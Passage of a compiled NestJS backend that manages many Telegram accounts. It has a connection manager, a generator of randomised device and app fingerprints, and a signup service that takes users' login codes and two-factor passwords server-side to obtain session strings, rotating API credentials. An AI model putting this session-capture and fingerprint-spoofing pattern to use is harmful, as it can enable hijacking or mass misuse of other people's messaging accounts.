        const telegramManager = new TelegramManager_1.default(user.session, user.mobile);
        const clientInfo = {
            client: telegramManager,
            lastUsed: Date.now(),
            autoDisconnect: options.autoDisconnect,
            connectionAttempts: 1,
            state: 'connecting',
            retryConfig,
            consecutiveFailures: 0,
            cleanupAttempts: 0
        };
        this.clients.set(mobile, clientInfo);
        try {
            const timeoutMs = 15000;
            const client = await Promise.race([
                telegramManager.createClient(options.handler),
                new Promise((_, reject) => setTimeout(() => reject(new Error(`Client creation timed out after ${timeoutMs}ms for ${mobile}`)), timeoutMs))
            ]);
            if (client) {
                clientInfo.state = 'connected';
                clientInfo.consecutiveFailures = 0;
                clientInfo.lastSuccessfulConnection = Date.now();
                delete clientInfo.lastError;
                delete clientInfo.nextRetryAt;
                this.clients.set(mobile, clientInfo);
                this.logger.info(mobile, 'New client created successfully');
                return telegramManager;
            }
            else {
                throw new Error('Client creation returned null');
            }
        }
        catch (error) {
            this.logger.error(mobile, 'New client creation failed', error);
            const errorDetails = (0, parseError_1.parseError)(error, mobile, false);
            try {
                await TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.ACCOUNT_LOGIN_FAILURES, `${process.env.clientId}::${mobile}\n\nAttempt: ${clientInfo.connectionAttempts}\nError: ${errorDetails.message}`);
            }
            catch (notificationError) {
                this.logger.error(mobile, 'Failed to send error notification', notificationError);
            }
            if ((0, utils_1.contains)(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', 'revoked', 'user_deactivated_ban'])) {
                this.logger.info(mobile, 'Marking user as expired due to permanent error');
                try {
                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });
                }
                catch (updateError) {
                    this.logger.error(mobile, 'Failed to mark user as expired', updateError);
                }
            }
            return this.handleConnectionError(mobile, clientInfo, error);
        }
    }
    async cleanupInactiveConnections(maxIdleTime = 180000) {
        if (this.isShuttingDown)
            return;
        this.logger.info('ConnectionManager', 'Perfroming Regular Cleanup');
        const now = Date.now();
        const cleanupResults = new Map();
        const cleanupPromises = [];
        for (const [mobile, connection] of this.clients.entries()) {
            const shouldCleanup = ((connection.autoDisconnect && connection.lastUsed <= now - 100000) || connection.lastUsed <= now - this.COOLDOWN_PERIOD) &&
                (now - connection.lastUsed > maxIdleTime ||
                    connection.state === 'error' ||
                    connection.consecutiveFailures >= connection.retryConfig.maxAttempts ||
                    (connection.state === 'connecting' && now - connection.lastUsed > this.CONNECTION_TIMEOUT * 2) ||
                    (connection.cleanupAttempts && connection.cleanupAttempts >= this.MAX_CLEANUP_ATTEMPTS));
            if (shouldCleanup) {
                this.logger.info(mobile, `Cleaning up connection - state: ${connection.state}, failures: ${connection.consecutiveFailures}, cleanup attempts: ${connection.cleanupAttempts || 0}`);
                const cleanupPromise = this.unregisterClient(mobile)
                    .then(() => {
                    cleanupResults.set(mobile, true);
                })
                    .catch((error) => {
                    this.logger.error(mobile, 'Cleanup failed', error);
                    cleanupResults.set(mobile, false);
                    const clientInfo = this.clients.get(mobile);
                    if (clientInfo) {
                        clientInfo.cleanupAttempts = (clientInfo.cleanupAttempts || 0) + 1;
                        this.clients.set(mobile, clientInfo);
                    }
                });
                cleanupPromises.push(cleanupPromise);
            }
        }
        if (cleanupPromises.length > 0) {
            try {
                await Promise.race([
                    Promise.allSettled(cleanupPromises),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Cleanup timeout')), 30000))
                ]);
            }
            catch (error) {
                this.logger.error('ConnectionManager', 'Cleanup operation timed out', error);
            }
            const failed = Array.from(cleanupResults.entries())
                .filter(([_, success]) => !success)
                .map(([mobile]) => mobile);
            if (failed.length > 0) {
                this.logger.info('ConnectionManager', `Cleanup completed. Failed cleanups: ${failed.join(', ')}`);
            }
            else {
                this.logger.info('ConnectionManager', `Cleanup completed successfully for ${cleanupResults.size} clients`);
            }
        }
    }
    updateLastUsed(mobile) {
        const connection = this.clients.get(mobile);
        if (connection) {
            connection.lastUsed = Date.now();
            this.clients.set(mobile, connection);
        }
    }
    hasClient(number) {
        const client = this.clients.get(number);
        return client !== undefined && client.state === 'connected';
    }
    async disconnectAll() {
        this.logger.info('ConnectionManager', 'Disconnecting all clients');
        const disconnectionPromises = [];
        for (const [mobile, connection] of this.clients.entries()) {
            if (connection.state !== 'disconnected') {
                connection.state = 'disconnecting';
                this.clients.set(mobile, connection);
                disconnectionPromises.push(this.unregisterClient(mobile));
            }
        }
        try {
            await Promise.race([
                Promise.allSettled(disconnectionPromises),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Disconnect all timeout')), 60000))
            ]);
        }
        catch (error) {
            this.logger.error('ConnectionManager', 'Disconnect all timed out', error);
        }
        this.clients.clear();
        this.logger.info('ConnectionManager', 'All clients disconnected');
    }
    async unregisterClient(mobile, timeoutMs = this.CLEANUP_TIMEOUT) {
        const clientInfo = this.clients.get(mobile);
        if (!clientInfo)
            return;
        this.logger.info(mobile, 'Unregistering client', {
            state: clientInfo.state,
            lastUsed: clientInfo.lastUsed,
            autoDisconnect: clientInfo.autoDisconnect
        });
        try {
            clientInfo.state = 'disconnecting';
            await clientInfo.client.destroy();
            this.clients.delete(mobile);
        }
        catch (error) {
            this.logger.error(mobile, 'Unregister failed', error);
        }
        try {
            await this.forceCleanupClient(mobile, clientInfo);
        }
        catch (forceError) {
            this.logger.error(mobile, 'Force cleanup also failed', forceError);
        }
    }
    async forceCleanupClient(mobile, clientInfo) {
        if (clientInfo.client?.client) {
            this.logger.info(mobile, 'Performing FORCE cleanup');
            try {
                await clientInfo.client.client.destroy();
            }
            catch (destroyError) {
                this.logger.error(mobile, 'Force destroy failed', destroyError);
            }
        }
        try {
            if (clientInfo.client) {
                if (clientInfo.client.client) {
                    clientInfo.client.client = null;
                }
                clientInfo.client = null;
            }
        }
        catch (refError) {
            this.logger.error(mobile, 'Reference cleanup in force mode failed', refError);
        }
        this.clients.delete(mobile);
        this.logger.info(mobile, 'Client removed from map');
    }
    getActiveConnectionCount() {
        return Array.from(this.clients.values())
            .filter(client => client.state === 'connected')
            .length;
    }
    getConnectionLeakReport() {
        const activeConnections = [];
        const zombieConnections = [];
        const staleConnections = [];
        const now = Date.now();
        for (const [mobile, clientInfo] of this.clients.entries()) {
            if (clientInfo.client) {
                const isClientConnected = clientInfo.client.connected();
                const stateConnected = clientInfo.state === 'connected';
                const isStale = now - clientInfo.lastUsed > this.COOLDOWN_PERIOD * 2;
                if (isClientConnected && stateConnected) {
                    activeConnections.push(mobile);
                }
                else if (!isClientConnected && stateConnected) {
                    zombieConnections.push(mobile);
                }
                else if (isStale && clientInfo.state !== 'disconnected') {
                    staleConnections.push(mobile);
                }
            }
        }
        return {
            mapSize: this.clients.size,
            activeConnections,
            zombieConnections,
            staleConnections
        };
    }
    async performHealthCheck() {
        if (this.isShuttingDown)
            return;
        const leakReport = this.getConnectionLeakReport();
        if (leakReport.zombieConnections.length > 0) {
            this.logger.info('ConnectionManager', `Health check: Detected ${leakReport.zombieConnections.length} zombie connections`);
            for (const mobile of leakReport.zombieConnections) {
                try {
                    await this.unregisterClient(mobile);
                }
                catch (error) {
                    this.logger.error(mobile, 'Health check cleanup failed', error);
                }
            }
        }
        if (leakReport.staleConnections.length > 0) {
            this.logger.info('ConnectionManager', `Health check: Detected ${leakReport.staleConnections.length} stale connections`);
            for (const mobile of leakReport.staleConnections) {
                try {
                    await this.unregisterClient(mobile);
                }
                catch (error) {
                    this.logger.error(mobile, 'Stale connection cleanup failed', error);
                }
            }
        }
        this.logger.info('ConnectionManager', `Health check completed - Active: ${leakReport.activeConnections.length}, Total: ${leakReport.mapSize}`, leakReport);
    }
    startCleanupInterval(intervalMs = 120000) {
        if (this.cleanupInterval) {
            return this.cleanupInterval;
        }
        this.stopCleanupInterval();
        this.cleanupInterval = setInterval(() => {
            if (!this.isShuttingDown) {
                this.cleanupInactiveConnections().catch(err => {
                    this.logger.error('ConnectionManager', 'Error in cleanup interval', err);
                });
                this.performHealthCheck().catch(err => {
                    this.logger.error('ConnectionManager', 'Error in initial health check', err);
                });
            }
        }, intervalMs);
        this.logger.info('ConnectionManager', `Cleanup interval started with ${intervalMs}ms interval`);
        this.cleanupInactiveConnections().catch(err => {
            this.logger.error('ConnectionManager', 'Error in initial cleanup', err);
        });
        return this.cleanupInterval;
    }
    stopCleanupInterval() {
        if (this.cleanupInterval) {
            clearInterval(this.cleanupInterval);
            this.logger.info('ConnectionManager', 'Cleanup interval stopped');
            this.cleanupInterval = null;
        }
    }
    getClientState(mobile) {
        const client = this.clients.get(mobile);
        if (client) {
            return {
                autoDisconnect: client.autoDisconnect,
                connectionAttempts: client.connectionAttempts,
                lastUsed: client.lastUsed,
                state: client.state,
                lastError: client.lastError
            };
        }
    }
    getConnectionStats() {
        const stats = {
            total: this.clients.size,
            connected: 0,
            connecting: 0,
            disconnecting: 0,
            disconnected: 0,
            error: 0,
            retrying: 0
        };
        const now = Date.now();
        for (const client of this.clients.values()) {
            if (client.state === 'error' && client.nextRetryAt && now < client.nextRetryAt) {
                stats.retrying++;
            }
            else {
                stats[client.state]++;
            }
        }
        return stats;
    }
    getClientInfo(mobile) {
        return this.clients.get(mobile);
    }
    async forceReconnect(mobile) {
        this.logger.info(mobile, 'Force reconnection requested');
        await this.unregisterClient(mobile);
        return this.getClient(mobile, { forceReconnect: true });
    }
    setRetryConfig(mobile, config) {
        const clientInfo = this.clients.get(mobile);
        if (clientInfo) {
            clientInfo.retryConfig = { ...clientInfo.retryConfig, ...config };
            this.clients.set(mobile, clientInfo);
            return true;
        }
        return false;
    }
}
ConnectionManager.instance = null;
exports.connectionManager = ConnectionManager.getInstance();


/***/ }),

/***/ "./src/components/Telegram/utils/generateTGConfig.ts":
/*!***********************************************************!*\
  !*** ./src/components/Telegram/utils/generateTGConfig.ts ***!
  \***********************************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.generateTGConfig = generateTGConfig;
function generateTGConfig() {
    const deviceModels = [
        "Pixel 6", "iPhone 13", "Samsung Galaxy S22", "Redmi Note 12", "OnePlus 9", "Desktop", "MacBook Pro", "iPad Pro"
    ];
    const systemVersions = [
        "Android 13", "iOS 16.6", "Windows 10", "Windows 11", "macOS 13.5", "Ubuntu 22.04", "Arch Linux"
    ];
    const appVersions = [
        "1.0.0", "2.1.3", "3.5.7", "4.0.2", "5.0.0"
    ];
    function pickRandom(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }
    return {
        connectionRetries: 10,
        requestRetries: 10,
        retryDelay: 5000,
        timeout: 60000,
        autoReconnect: true,
        useWSS: true,
        maxConcurrentDownloads: 3,
        downloadRetries: 10,
        floodSleepThreshold: 180,
        deviceModel: `${pickRandom(deviceModels)}-ssk`,
        systemVersion: pickRandom(systemVersions),
        appVersion: pickRandom(appVersions),
        useIPV6: true,
        testServers: false
    };
}


/***/ }),

/***/ "./src/components/Telegram/utils/telegram-logger.ts":
/*!**********************************************************!*\
  !*** ./src/components/Telegram/utils/telegram-logger.ts ***!
  \**********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramLogger = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
class TelegramLogger {
    constructor() {
        this.logger = new common_1.Logger('TelegramService');
    }
    static getInstance() {
        if (!TelegramLogger.instance) {
            TelegramLogger.instance = new TelegramLogger();
        }
        return TelegramLogger.instance;
    }
    shouldIncludeDetails(details) {
        return details !== undefined
            && details !== null
            && !(typeof details === 'object' && Object.keys(details).length === 0);
    }
    formatMessage(mobile, message, details) {
        return this.shouldIncludeDetails(details)
            ? `[${mobile}] ${message} - ${JSON.stringify(details)}`
            : `[${mobile}] ${message}`;
    }
    info(mobile, operation, details) {
        this.logger.log(this.formatMessage(mobile, operation, details));
    }
    error(mobile, operation, error) {
        this.logger.error(`[${mobile}] ${operation} failed - ${error.message}`, error.stack);
    }
    waning(mobile, message, details) {
        this.logger.warn(this.formatMessage(mobile, message, details));
    }
    debug(mobile, message, details) {
        this.logger.debug(this.formatMessage(mobile, message, details));
    }
}
exports.TelegramLogger = TelegramLogger;


/***/ }),

/***/ "./src/components/TgSignup/dto/tg-signup.dto.ts":
/*!******************************************************!*\
  !*** ./src/components/TgSignup/dto/tg-signup.dto.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupResponse = exports.VerifyCodeDto = exports.SendCodeDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SendCodeDto {
}
exports.SendCodeDto = SendCodeDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone number to send the verification code to (international format)',
        example: '+919876543210'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\+\d{8,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], SendCodeDto.prototype, "phone", void 0);
class VerifyCodeDto {
}
exports.VerifyCodeDto = VerifyCodeDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone number used for verification (international format)',
        example: '919876543210'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\+\d{8,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "phone", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Verification code received',
        example: '12345'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\d{5}$/, { message: 'Code must be exactly 5 digits' }),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "code", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Two-factor authentication password if required',
        example: 'yourSecurePassword123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => value === '' ? undefined : value),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "password", void 0);
class TgSignupResponse {
}
exports.TgSignupResponse = TgSignupResponse;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Operation status code',
        example: 200
    }),
    __metadata("design:type", Number)
], TgSignupResponse.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Response message',
        example: 'Login successful'
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone code hash for verification',
        example: 'abc123xyz',
        required: false
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "phoneCodeHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the code was sent via app',
        example: true,
        required: false
    }),
    __metadata("design:type", Boolean)
], TgSignupResponse.prototype, "isCodeViaApp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Session string for authenticated client',
        required: false
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether 2FA is required',
        example: false,
        required: false
    }),
    __metadata("design:type", Boolean)
], TgSignupResponse.prototype, "requires2FA", void 0);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.controller.ts":
/*!*********************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.controller.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var TgSignupController_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const tg_signup_service_1 = __webpack_require__(/*! ./tg-signup.service */ "./src/components/TgSignup/tg-signup.service.ts");
const tg_signup_dto_1 = __webpack_require__(/*! ./dto/tg-signup.dto */ "./src/components/TgSignup/dto/tg-signup.dto.ts");
let TgSignupController = TgSignupController_1 = class TgSignupController {
    constructor(tgSignupService) {
        this.tgSignupService = tgSignupService;
        this.logger = new common_1.Logger(TgSignupController_1.name);
    }
    async sendCode(sendCodeDto) {
        try {
            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);
            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);
            return {
                status: common_1.HttpStatus.CREATED,
                message: 'Code sent to your Telegram App',
                phoneCodeHash: result.phoneCodeHash,
                isCodeViaApp: result.isCodeViaApp
            };
        }
        catch (error) {
            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {
                error,
                stack: error.stack
            });
            throw error;
        }
    }
    async verifyCode(verifyCodeDto) {
        try {
            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);
            const result = await this.tgSignupService.verifyCode(verifyCodeDto.phone, verifyCodeDto.code, verifyCodeDto.password);
            return {
                status: result.requires2FA ? common_1.HttpStatus.BAD_REQUEST : common_1.HttpStatus.OK,
                message: result.message || 'Successfully logged in',
                session: result.session,
                requires2FA: result.requires2FA
            };
        }
        catch (error) {
            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {
                error,
                stack: error.stack
            });
            throw error;
        }
    }
};
exports.TgSignupController = TgSignupController;
__decorate([
    (0, common_1.Post)('send-code'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send verification code to phone number',
        description: 'Initiates the signup process by sending a verification code via Telegram'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.CREATED,
        type: tg_signup_dto_1.TgSignupResponse,
        description: 'Code sent successfully'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid phone number or failed to send code',
        schema: {
            type: 'object',
            properties: {
                statusCode: { type: 'number', example: 400 },
                message: { type: 'string', example: 'Invalid phone number format' },
                error: { type: 'string', example: 'Bad Request' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.TOO_MANY_REQUESTS,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
        description: 'Internal server error occurred'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [tg_signup_dto_1.SendCodeDto]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "sendCode", null);
__decorate([
    (0, common_1.Post)('verify'),
    (0, swagger_1.ApiOperation)({
        summary: 'Verify code and complete signup/login',
        description: 'Verifies the code sent to phone and completes the signup/login process'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        type: tg_signup_dto_1.TgSignupResponse,
        description: 'Verification successful'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid code or verification failed'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.TOO_MANY_REQUESTS,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
        description: 'Internal server error occurred'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [tg_signup_dto_1.VerifyCodeDto]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "verifyCode", null);
exports.TgSignupController = TgSignupController = TgSignupController_1 = __decorate([
    (0, common_1.Controller)('tgsignup'),
    (0, swagger_1.ApiTags)('tgsignup'),
    (0, swagger_1.ApiExtraModels)(tg_signup_dto_1.SendCodeDto, tg_signup_dto_1.VerifyCodeDto, tg_signup_dto_1.TgSignupResponse),
    __metadata("design:paramtypes", [tg_signup_service_1.TgSignupService])
], TgSignupController);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.module.ts":
/*!*****************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.module.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const tg_signup_controller_1 = __webpack_require__(/*! ./tg-signup.controller */ "./src/components/TgSignup/tg-signup.controller.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const tg_signup_service_1 = __webpack_require__(/*! ./tg-signup.service */ "./src/components/TgSignup/tg-signup.service.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TgSignupModule = class TgSignupModule {
};
exports.TgSignupModule = TgSignupModule;
exports.TgSignupModule = TgSignupModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            (0, common_1.forwardRef)(() => users_module_1.UsersModule)
        ],
        controllers: [tg_signup_controller_1.TgSignupController],
        providers: [tg_signup_service_1.TgSignupService],
        exports: [tg_signup_service_1.TgSignupService]
    })
], TgSignupModule);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.service.ts":
/*!******************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.service.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var TgSignupService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const Password_1 = __webpack_require__(/*! telegram/Password */ "telegram/Password");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
let TgSignupService = TgSignupService_1 = class TgSignupService {
    constructor(usersService) {
        this.usersService = usersService;
        this.logger = new common_1.Logger(TgSignupService_1.name);
        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService_1.SESSION_CLEANUP_INTERVAL);
    }
    async onModuleDestroy() {
        clearInterval(this.cleanupInterval);
        const phones = Array.from(TgSignupService_1.activeClients.keys());
        await Promise.all(phones.map(phone => this.disconnectClient(phone)));
    }
    getRandomCredentials() {
        const index = Math.floor(Math.random() * TgSignupService_1.API_CREDENTIALS.length);
        return TgSignupService_1.API_CREDENTIALS[index];
    }
    async cleanupStaleSessions() {
        for (const [phone, session] of TgSignupService_1.activeClients) {
            try {
                if (Date.now() - session.createdAt > TgSignupService_1.LOGIN_TIMEOUT &&
                    (!session.client || !session.client.connected)) {
                    await this.disconnectClient(phone);
                }
            }
            catch (error) {
                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);
            }
        }
    }
    validatePhoneNumber(phone) {
        phone = phone.replace(/^\+/, '');
        if (!/^\d{8,15}$/.test(phone)) {
            throw new common_1.BadRequestException('Please enter a valid phone number');
        }
        return phone;
    }
    async disconnectClient(phone) {
        const session = TgSignupService_1.activeClients.get(phone);
        if (session) {
            try {
                clearTimeout(session.timeoutId);
                await session.client.destroy();
                this.logger.log(`Client disconnected for ${phone}`);
            }
            catch (error) {
                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);
            }
            finally {
                TgSignupService_1.activeClients.delete(phone);
            }
        }
    }
    async sendCode(phone) {
        try {
            phone = this.validatePhoneNumber(phone);
            const existingSession = TgSignupService_1.activeClients.get(phone);
            if (existingSession && existingSession.client?.connected) {
                await this.disconnectClient(phone);
            }
            const { apiId, apiHash } = this.getRandomCredentials();
            const session = new sessions_1.StringSession('');
            const client = new telegram_1.TelegramClient(session, apiId, apiHash, {
                connectionRetries: 5,
                retryDelay: 2000,
                useWSS: true,
                timeout: 30000
            });
            await client.setLogLevel(Logger_1.LogLevel.ERROR);
            await client.connect();
            const sendResult = await client.invoke(new tl_1.Api.auth.SendCode({
                phoneNumber: phone,
                apiId,
                apiHash,
                settings: new tl_1.Api.CodeSettings({
                    currentNumber: true,
                    allowAppHash: true,
                }),
            }));
            if (sendResult instanceof tl_1.Api.auth.SentCodeSuccess) {
                this.logger.error(`Unexpected immediate login for ${phone}`);
                throw new common_1.BadRequestException('Unexpected immediate login');
            }
            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService_1.LOGIN_TIMEOUT);
            TgSignupService_1.activeClients.set(phone, {
                client,
                phoneCodeHash: sendResult.phoneCodeHash,
                timeoutId,
                createdAt: Date.now()
            });
            return {
                phoneCodeHash: sendResult.phoneCodeHash,
                isCodeViaApp: sendResult.type instanceof tl_1.Api.auth.SentCodeTypeApp,
            };
        }
        catch (error) {
            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);
            await this.disconnectClient(phone);
            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {
                throw new common_1.BadRequestException('This phone number has been banned from Telegram');
            }
            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {
                throw new common_1.BadRequestException('Please enter a valid phone number');
            }
            if (error.errorMessage?.includes('FLOOD_WAIT')) {
                throw new common_1.BadRequestException('Please wait a few minutes before trying again');
            }
            throw new common_1.BadRequestException('Unable to send OTP. Please try again');
        }
    }
    async verifyCode(phone, code, password) {
        try {
            phone = this.validatePhoneNumber(phone);
            const session = TgSignupService_1.activeClients.get(phone);
            if (!session) {
                this.logger.warn(`No active signup session found for ${phone}`);
                throw new common_1.BadRequestException('Session Expired. Please start again');
            }
            clearTimeout(session.timeoutId);
            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService_1.LOGIN_TIMEOUT);
            if (!session.client?.connected) {
                try {
                    await session.client?.connect();
                }
                catch (error) {
                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);
                    try {
                        const { apiId, apiHash } = this.getRandomCredentials();
                        const newSession = new sessions_1.StringSession('');
                        const newClient = new telegram_1.TelegramClient(newSession, apiId, apiHash, {
                            connectionRetries: 5,
                            retryDelay: 2000,
                            useWSS: true,
                            timeout: 30000
                        });
                        await newClient.connect();
                        session.client = newClient;
                    }
                    catch (reconnectError) {
                        throw new common_1.BadRequestException('Connection failed. Please try verifying again.');
                    }
                }
            }
            const { client, phoneCodeHash } = session;
            try {
                this.logger.debug(`Attempting to sign in with code for ${phone}`);
                const signInResult = await client.invoke(new tl_1.Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash,
                    phoneCode: code,
                }));
                if (!signInResult) {
                    throw new common_1.BadRequestException('Invalid response from Telegram server');
                }
                if (signInResult instanceof tl_1.Api.auth.AuthorizationSignUpRequired) {
                    this.logger.log(`New user registration required for ${phone}`);
